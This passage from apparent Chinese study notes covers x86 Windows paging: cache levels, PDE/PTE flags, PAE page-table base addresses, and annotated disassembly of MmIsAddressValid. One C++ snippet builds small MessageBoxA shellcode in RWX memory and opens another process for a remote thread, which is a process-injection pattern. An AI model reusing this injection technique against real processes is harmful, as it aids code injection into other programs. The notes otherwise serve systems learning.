没有找到，找页表结构缓存，如果没有找到，就自己转化</p>\n<p>3. 有 PTE + 页内偏移拿到数据</p>\n<p>4. 所有的缓存中找不到，把物理地址转化为真正的物理地址 (内存条 板卡地址)</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231016234849139.png\" alt=\"image-20231016234849139\"></p>\n<p>L1 L2 叫做局部缓存，是 CPU 内部缓存，每一个核都有自己的 L1 L2</p>\n<p>L3 所有 CPU 共享缓存</p>\n<p>虚拟的逻辑 CPU 对用一个 L1 L2 缓存</p>\n<p>data 数据缓存   inst 指令缓存</p>\n<p>从 L2 中拿到缓存，会把 L2 这页的缓存替换到 L1 中</p>\n<p>L3 拿到会写到 L2 和 L1</p>\n<h3 id=\"幽灵地址\"><a class=\"markdownIt-Anchor\" href=\"#幽灵地址\">#</a> 幽灵地址</h3>\n<p>101012 中所有的地址都可以被当做代码执行</p>\n<p>申请内存的时候如果没有初始化，只有线性地址，没有物理地址，没有物理页，!dd 中为 0</p>\n<p>共享内存：多个线性地址共用一个或多个物理页</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231020172843070.png\" alt=\"image-20231020172843070\"></p>\n<p>多核场景下，同时写一块物理内存会有问题。可以加锁，还可以互斥体，信号量，时间可以，临界区不行，因为他不能跨进程</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint *x = NULL;</span><br><span class=\"line\">\tPVOID mem = VirtualAlloc(0,0x100,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tmemset(mem,1,4);</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%x\\r\\n&quot;,mem);</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\tprintf(&quot;%x\\r\\n&quot;,*x);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tsystem(&quot;pause&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>通过修改 PDE 实现挂物理页，!ed</p>\n<p>跨进程挂物理页</p>\n<p>把 A 进程的物理页拿出来，挂到的 B 的 0 地址上</p>\n<p>通过远程线程跑起来</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;Windows.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> _tmain(<span class=\"type\">int</span> argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span>*x =  <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tPVOID mem = <span class=\"built_in\">VirtualAlloc</span>(<span class=\"number\">0</span>,<span class=\"number\">0x100</span>,MEM_COMMIT,PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\t<span class=\"comment\">//memset(mem,1,4);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\r\\n\t&quot;</span>,mem);</span><br><span class=\"line\">\t<span class=\"type\">char</span> bufcode[]=</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"number\">0x6A</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x6A</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x6A</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0x6A</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xb8</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xff</span>,<span class=\"number\">0xd0</span>,</span><br><span class=\"line\">\t\t<span class=\"number\">0xc2</span>,<span class=\"number\">4</span>,<span class=\"number\">0</span></span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">char</span> user32[]=&#123;<span class=\"string\">&#x27;u&#x27;</span>,<span class=\"string\">&#x27;s&#x27;</span>,<span class=\"string\">&#x27;e&#x27;</span>,<span class=\"string\">&#x27;r&#x27;</span>,<span class=\"string\">&#x27;3&#x27;</span>,<span class=\"string\">&#x27;2&#x27;</span>,<span class=\"string\">&#x27;.&#x27;</span>,<span class=\"string\">&#x27;d&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"string\">&#x27;l&#x27;</span>,<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\">\t<span class=\"type\">char</span> MessageBoxAA[]=&#123;<span class=\"string\">&quot;MessageBoxA&quot;</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tHMODULE hmodule = <span class=\"built_in\">LoadLibraryA</span>(user32);</span><br><span class=\"line\">\tULONG messageBox = (ULONG)<span class=\"built_in\">GetProcAddress</span>(hmodule,MessageBoxAA);</span><br><span class=\"line\">\t*(PULONG)&amp;bufcode[<span class=\"number\">9</span>] = messageBox;</span><br><span class=\"line\">\t<span class=\"built_in\">memcpy</span>(mem,bufcode,<span class=\"built_in\">sizeof</span>(bufcode));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tHANDLE hProcess = <span class=\"built_in\">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE,<span class=\"number\">1292</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"built_in\">CreateRemoteThread</span>(hProcess,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"number\">0</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">CloseHandle</span>(hThread);</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%x\\r\\n&quot;</span>,*x);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//int error = GetLastError();</span></span><br><span class=\"line\">\t<span class=\"built_in\">system</span>(<span class=\"string\">&quot;pause&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>1. 没有多余的额内存，直接申请 64k</p>\n<p>2. 有多余的没存，在多余的内存，在多余的内存，按照 4k 对齐</p>\n<h3 id=\"页属性\"><a class=\"markdownIt-Anchor\" href=\"#页属性\">#</a> 页属性</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">char *x = &quot;1111111&quot;;    // 可读，包含初始化的数据</span><br><span class=\"line\">通过characteristic 判断是否可写</span><br><span class=\"line\">标志(属性块) 常用特征值对照表：</span><br><span class=\"line\">[值:00000020h] [IMAGE_SCN_CNT_CODE                // Section contains code.(包含可执行代码)]</span><br><span class=\"line\">[值:00000040h] [IMAGE_SCN_CNT_INITIALIZED_DATA    // Section contains initialized data.(该块包含已初始化的数据)]</span><br><span class=\"line\">[值:00000080h] [IMAGE_SCN_CNT_UNINITIALIZED_DATA  // Section contains uninitialized data.(该块包含未初始化的数据)]</span><br><span class=\"line\">[值:00000200h] [IMAGE_SCN_LNK_INFO                // Section contains comments or some other type of information.]</span><br><span class=\"line\">[值:00000800h] [IMAGE_SCN_LNK_REMOVE              // Section contents will not become part of image.]</span><br><span class=\"line\">[值:00001000h] [IMAGE_SCN_LNK_COMDAT              // Section contents comdat.]</span><br><span class=\"line\">[值:00004000h] [IMAGE_SCN_NO_DEFER_SPEC_EXC       // Reset speculative exceptions handling bits in the TLB entries for this section.]</span><br><span class=\"line\">[值:00008000h] [IMAGE_SCN_GPREL                   // Section content can be accessed relative to GP.]</span><br><span class=\"line\">[值:00500000h] [IMAGE_SCN_ALIGN_16BYTES           // Default alignment if no others are specified.]</span><br><span class=\"line\">[值:01000000h] [IMAGE_SCN_LNK_NRELOC_OVFL         // Section contains extended relocations.]</span><br><span class=\"line\">[值:02000000h] [IMAGE_SCN_MEM_DISCARDABLE         // Section can be discarded.]</span><br><span class=\"line\">[值:04000000h] [IMAGE_SCN_MEM_NOT_CACHED          // Section is not cachable.]</span><br><span class=\"line\">[值:08000000h] [IMAGE_SCN_MEM_NOT_PAGED           // Section is not pageable.]</span><br><span class=\"line\">[值:10000000h] [IMAGE_SCN_MEM_SHARED              // Section is shareable(该块为共享块).]</span><br><span class=\"line\">[值:20000000h] [IMAGE_SCN_MEM_EXECUTE             // Section is executable.(该块可执行)]</span><br><span class=\"line\">[值:40000000h] [IMAGE_SCN_MEM_READ                // Section is readable.(该块可读)]</span><br><span class=\"line\">[值:80000000h] [IMAGE_SCN_MEM_WRITE               // Section is writeable.(该块可写)]</span><br><span class=\"line\">// x 在 rdata中，40000040 可读，包含已初始化数据，但是不可写</span><br><span class=\"line\"></span><br><span class=\"line\">// 查询</span><br><span class=\"line\">sgdt 内存，6字节</span><br><span class=\"line\">sidt</span><br><span class=\"line\"></span><br><span class=\"line\">// 特权指令</span><br><span class=\"line\">1gdt</span><br><span class=\"line\">lidt</span><br><span class=\"line\"></span><br><span class=\"line\">char sgdtbuf[6] = &#123;0&#125;;</span><br><span class=\"line\">__asm&#123;</span><br><span class=\"line\">\tsgdt sgdtbuf</span><br><span class=\"line\">&#125; </span><br><span class=\"line\">ULONG gdtTable = *(PULONG)&amp;sgdtbuf[2];</span><br><span class=\"line\">ULONG gdtlimit = *(PSHORT)&amp;sgdtbuf[0];</span><br><span class=\"line\">printf(&quot;%x\\r\\n %x\\r\\n&quot;,gdtTable,gdtlimit)   r gdtr    r gdtl</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231020233208888.png\" alt=\"image-20231020233208888\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231020231326046.png\" alt=\"image-20231020231326046\"></p>\n<p>P：当前页是否有效，即真实物理页</p>\n<p>R/W： 0 当前页只读页      = PTE &amp; PDE=1 时，可以修改</p>\n<p>U/S: 页特权位，=0 只有 3 环能访问   User/Super</p>\n<p>G：全局页，切换 CR3 不刷新，只有内核中有，不手动刷新会一直缓存</p>\n<p>A 、 D 和段一样，access 被访问过 A=1，被写过 D=1</p>\n<p>PS：PDE.PS=1, 此时没有 PTE   大页，此时是 10 22 ，10 是索引，22 是偏移，一个 PDE 有 4M</p>\n<p>avail：操作系统用到</p>\n<p>3 环要是写高地址需要 P=1 R/W=1  U/S=1 P=0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231021194659993.png\" alt=\"image-20231021194659993\"></p>\n<h3 id=\"页基址\"><a class=\"markdownIt-Anchor\" href=\"#页基址\">#</a> 页基址</h3>\n<p>无法直接操作物理地址，只能通过线性地址</p>\n<p>第一次进入保护模式 的时候 线性地址与物理地址有一对一的等价映射</p>\n<p>高地址中页管理的空间不是共享的</p>\n<p>每个进程在高地址中有 4M 空间不共享</p>\n<p>system 在低地址中没有内存</p>\n<p>内核中没有附加进程，属于 system 进程</p>\n<p>挂物理页，且 P=1，那么有效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00489B98                 mov     eax, ecx</span><br><span class=\"line\">.text:00489B9A                 shr     eax, 14h\t\t\t右移20位</span><br><span class=\"line\">.text:00489B9D                 and     eax, 0FFCh</span><br><span class=\"line\">.text:00489BA2                 sub     eax, 3FD00000h</span><br><span class=\"line\">.text:00489BA7                 mov     eax, [eax]</span><br><span class=\"line\">.text:00489BA9                 test    al, 1</span><br><span class=\"line\">.text:00489BAB                 jnz     short loc_489BB0    ;判断PDE p位</span><br><span class=\"line\">.text:00489BAD</span><br><span class=\"line\">.text:00489BAD loc_489BAD:                             ; CODE XREF: sub_489B98+32\u0019j</span><br><span class=\"line\">.text:00489BAD                 xor     al, al</span><br><span class=\"line\">.text:00489BAF                 retn</span><br><span class=\"line\">.text:00489BB0 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00489BB0</span><br><span class=\"line\">.text:00489BB0 loc_489BB0:                             ; CODE XREF: sub_489B98+13\u0018j</span><br><span class=\"line\">.text:00489BB0                 test    al, al</span><br><span class=\"line\">.text:00489BB2                 jns     short loc_489BB7; 判断是否是大页</span><br><span class=\"line\">.text:00489BB4                 mov     al, 1</span><br><span class=\"line\">.text:00489BB6                 retn</span><br><span class=\"line\">.text:00489BB7 ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:00489BB7</span><br><span class=\"line\">.text:00489BB7 loc_489BB7:                             ; CODE XREF: sub_489B98+1A\u0018j</span><br><span class=\"line\">.text:00489BB7                 shr     ecx, 0Ah</span><br><span class=\"line\">.text:00489BBA                 and     ecx, 3FFFFCh</span><br><span class=\"line\">.text:00489BC0                 sub     ecx, 40000000h</span><br><span class=\"line\">.text:00489BC6                 mov     eax, [ecx]</span><br><span class=\"line\">.text:00489BC8                 test    al, 1</span><br><span class=\"line\">.text:00489BCA                 jz      short loc_489BAD</span><br><span class=\"line\">.text:00489BCC                 and     al, 80h</span><br><span class=\"line\">.text:00489BCE                 cmp     al, 80h</span><br><span class=\"line\">.text:00489BD0                 setnz   al</span><br><span class=\"line\">.text:00489BD3                 retn</span><br><span class=\"line\">.text:00489BD3 sub_489B98      endp</span><br></pre></td></tr></table></figure>\n<p>PDE，P=1，PS=1，有效</p>\n<p>PDE P=1，ps=0，PTE P=1 PAT=0 有效</p>\n<p>C0300000 + PDI*4 = PDE</p>\n<p>C0000000 + PDI * 0x1000 + PTI*4 = PTE</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231210191417372.png\" alt=\"image-20231210191417372\"></p>\n<h3 id=\"29912\"><a class=\"markdownIt-Anchor\" href=\"#29912\">#</a> 29912</h3>\n<p>ARM 分页 2048</p>\n<p>PC 4096</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x80b99000</span><br><span class=\"line\"></span><br><span class=\"line\">10    -   2</span><br><span class=\"line\"></span><br><span class=\"line\">00 0000 101   5</span><br><span class=\"line\"></span><br><span class=\"line\">1 1001 1001      199</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">!dq cr3 + 2 * 8 + 5 * 8 + 199 * 8</span><br></pre></td></tr></table></figure>\n<p>29912 虚拟地址还是 32 位，支持 36 根地址总线，所以物理地址是 36 位</p>\n<p>PDPTE -&gt; PDE -&gt; PTE</p>\n<p>2^2* 8 = 0x20</p>\n<p>29912 中基址只有 PDE 和 PTE</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:00411717 ; BOOLEAN __stdcall MmIsAddressValid(PVOID VirtualAddress)</span><br><span class=\"line\">.text:00411717                 public MmIsAddressValid</span><br><span class=\"line\">.text:00411717 MmIsAddressValid proc near              ; CODE XREF: sub_40471B+31\u0018p</span><br><span class=\"line\">.text:00411717                                         ; sub_4C9A84+13\u0019p ...</span><br><span class=\"line\">.text:00411717</span><br><span class=\"line\">.text:00411717 VirtualAddress  = dword ptr  8</span><br><span class=\"line\">.text:00411717</span><br><span class=\"line\">.text:00411717                 mov     edi, edi</span><br><span class=\"line\">.text:00411719                 push    ebp</span><br><span class=\"line\">.text:0041171A                 mov     ebp, esp</span><br><span class=\"line\">.text:0041171C                 mov     edx, [ebp+VirtualAddress]</span><br><span class=\"line\">.text:0041171F                 call    sub_4B4AA8</span><br><span class=\"line\">.text:00411724                 pop     ebp</span><br><span class=\"line\">.text:00411725                 retn    4</span><br><span class=\"line\">.text:00411725 MmIsAddressValid endp</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">.text:004B4AA8                 mov     edi, edi</span><br><span class=\"line\">.text:004B4AAA                 push    ebp</span><br><span class=\"line\">.text:004B4AAB                 mov     ebp, esp</span><br><span class=\"line\">.text:004B4AAD                 push    ecx            \t\t;保存易变寄存器</span><br><span class=\"line\">.text:004B4AAE                 push    ecx\t\t\t\t    ; esi-sbp是非易变寄存器</span><br><span class=\"line\">.text:004B4AAF                 mov     eax, edx     \t\t;edx是外部传来的线性地址</span><br><span class=\"line\">.text:004B4AB1                 shr     eax, 12h\t\t\t\t;右移18位，</span><br><span class=\"line\">.text:004B4AB4                 and     eax, 3FF8h</span><br><span class=\"line\">.text:004B4AB9                 sub     eax, 3FA00000h\t\t; PDE 基址</span><br><span class=\"line\">.text:004B4ABE                 mov     ecx, [eax]\t\t\t; 低4字节存</span><br><span class=\"line\">.text:004B4AC0                 mov     eax, [eax+4]</span><br><span class=\"line\">.text:004B4AC3                 mov     [ebp+var_4], eax</span><br><span class=\"line\">.text:004B4AC6                 mov     eax, ecx\t\t\t\t;低位给eax</span><br><span class=\"line\">.text:004B4AC8                 and     eax, 1\t\t\t\t;判断p位</span><br><span class=\"line\">.text:004B4ACB                 push    0</span><br><span class=\"line\">.text:004B4ACD                 mov     [ebp+var_8], eax</span><br><span class=\"line\">.text:004B4AD0                 pop     eax</span><br><span class=\"line\">.text:004B4AD1                 jz      short loc_4B4AD7\t\t\t; 根据p位是否 =0 跳 ， =0 跳</span><br><span class=\"line\">.text:004B4AD3                 test    eax, eax</span><br><span class=\"line\">.text:004B4AD5                 jz      short loc_4B4ADB\t\t\t;效果和jmp一样</span><br><span class=\"line\">.text:004B4AD7</span><br><span class=\"line\">.text:004B4AD7 loc_4B4AD7:                             ; CODE XREF: sub_4B4AA8+29\u0018j</span><br><span class=\"line\">.text:004B4AD7                 xor     al, al\t\t\t\t; 返回0</span><br><span class=\"line\">.text:004B4AD9                 leave</span><br><span class=\"line\">.text:004B4ADA                 retn</span><br><span class=\"line\">.text:004B4ADB ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:004B4ADB</span><br><span class=\"line\">.text:004B4ADB loc_4B4ADB:                             ; CODE XREF: sub_4B4AA8+2D\u0018j</span><br><span class=\"line\">.text:004B4ADB                 push    esi\t\t\t\t; 保存非易变寄存器</span><br><span class=\"line\">.text:004B4ADC                 mov     esi, 80h\t\t\t; 判断大页 ,80是大页</span><br><span class=\"line\">.text:004B4AE1                 and     ecx, esi</span><br><span class=\"line\">.text:004B4AE3                 push    0</span><br><span class=\"line\">.text:004B4AE5                 mov     [ebp+var_8], ecx</span><br><span class=\"line\">.text:004B4AE8                 pop     eax</span><br><span class=\"line\">.text:004B4AE9                 jz      short loc_4B4AEF  =0 是小页</span><br><span class=\"line\">.text:004B4AEB                 test    eax, eax</span><br><span class=\"line\">.text:004B4AED                 jz      short loc_4B4B2B\t\t;如果是大页，返回1</span><br><span class=\"line\">.text:004B4AEF</span><br><span class=\"line\">.text:004B4AEF loc_4B4AEF:                             ; CODE XREF: sub_4B4AA8+41\u0018j</span><br><span class=\"line\">.text:004B4AEF                 shr     edx, 9</span><br><span class=\"line\">.text:004B4AF2                 and     edx, 7FFFF8h</span><br><span class=\"line\">.text:004B4AF8                 mov     ecx, [edx-3FFFFFFCh]\t\t\t; 获取pte高位4字节，c0000000 是PTE基址，29912下c0600000是PDE基址</span><br><span class=\"line\">.text:004B4AFE                 sub     edx, 40000000h\t\t\t\t\t(edx &gt;&gt; 9) &amp; 0x7fff8 ,ecx=*(edx+c00000004)</span><br><span class=\"line\">.text:004B4B04                 mov     eax, [edx]\t\t\t\t\t\teax = *(edx+c0000000)</span><br><span class=\"line\">.text:004B4B06                 mov     [ebp+var_4], ecx</span><br><span class=\"line\">.text:004B4B09                 mov     ecx, eax</span><br><span class=\"line\">.text:004B4B0B                 and     ecx, 1\t\t\t\t\t\t\tPTE.P </span><br><span class=\"line\">.text:004B4B0E                 push    0</span><br><span class=\"line\">.text:004B4B10                 mov     [ebp+var_8], ecx</span><br><span class=\"line\">.text:004B4B13                 pop     ecx</span><br><span class=\"line\">.text:004B4B14                 jz      short loc_4B4B27</span><br><span class=\"line\">.text:004B4B16                 test    ecx, ecx</span><br><span class=\"line\">.text:004B4B18                 jnz     short loc_4B4B27\t\t\t\t\tpte.pat</span><br><span class=\"line\">.text:004B4B1A                 and     eax, esi</span><br><span class=\"line\">.text:004B4B1C                 push    ecx</span><br><span class=\"line\">.text:004B4B1D                 mov     [ebp+var_8], eax</span><br><span class=\"line\">.text:004B4B20                 pop     eax</span><br><span class=\"line\">.text:004B4B21                 jz      short loc_4B4B2B</span><br><span class=\"line\">.text:004B4B23                 test    eax, eax</span><br><span class=\"line\">.text:004B4B25                 jnz     short loc_4B4B2B</span><br><span class=\"line\">.text:004B4B27</span><br><span class=\"line\">.text:004B4B27 loc_4B4B27:                             ; CODE XREF: sub_4B4AA8+6C\u0018j</span><br><span class=\"line\">.text:004B4B27                                         ; sub_4B4AA8+70\u0018j</span><br><span class=\"line\">.text:004B4B27                 xor     al, al</span><br><span class=\"line\">.text:004B4B29                 jmp     short loc_4B4B2D</span><br><span class=\"line\">.text:004B4B2B ; ---------------------------------------------------------------------------</span><br><span class=\"line\">.text:004B4B2B</span><br><span class=\"line\">.text:004B4B2B loc_4B4B2B:                             ; CODE XREF: sub_4B4AA8+45\u0018j</span><br><span class=\"line\">.text:004B4B2B                                         ; sub_4B4AA8+79\u0018j ...</span><br><span class=\"line\">.text:004B4B2B                 mov     al, 1</span><br><span class=\"line\">.text:004B4B2D</span><br><span class=\"line\">.text:004B4B2D loc_4B4B2D:                             ; CODE XREF: sub_4B4AA8+81\u0018j</span><br><span class=\"line\">.text:004B4B2D                 pop     esi</span><br><span 